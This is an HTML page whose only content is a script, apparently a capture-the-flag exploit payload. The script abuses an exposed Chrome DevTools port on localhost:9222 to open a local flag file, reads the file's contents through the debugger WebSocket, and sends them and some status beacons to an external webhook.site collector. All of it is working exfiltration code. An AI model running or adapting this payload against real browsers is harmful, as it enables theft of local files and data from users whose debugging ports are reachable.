
<!doctype html>
<html>
<body>
<script>
const collector = "https://webhook.site/2282d57b-95b2-4244-bd6c-118059bc5963";

function report(stage, detail = "") {
  const url = collector + "?stage=" + encodeURIComponent(stage)
    + "&detail=" + encodeURIComponent(String(detail));
  new Image().src = url;
}

(async () => {
  report("payload-loaded");

  try {
    const response = await fetch(
      "http://localhost:9222/json/new?file:///challenge/flag-53035d3cba0664dfac37ff64b6e0f86e",
      { method: "PUT" }
    );

    const target = await response.json();
    report("devtools-response", JSON.stringify(target));

    const ws = new WebSocket(target.webSocketDebuggerUrl);

    ws.onerror = () => report("websocket-error");

    ws.onopen = () => {
      ws.send(JSON.stringify({
        id: 1,
        method: "Runtime.evaluate",
        params: {
          expression: "document.body.innerHTML",
          returnByValue: true
        }
      }));
    };

    ws.onmessage = event => {
      report("devtools-result", event.data);
      ws.close();
    };
  } catch (error) {
    report("exception", error.stack || error.message || error);
  }
})();
</script>
</body>
</html>
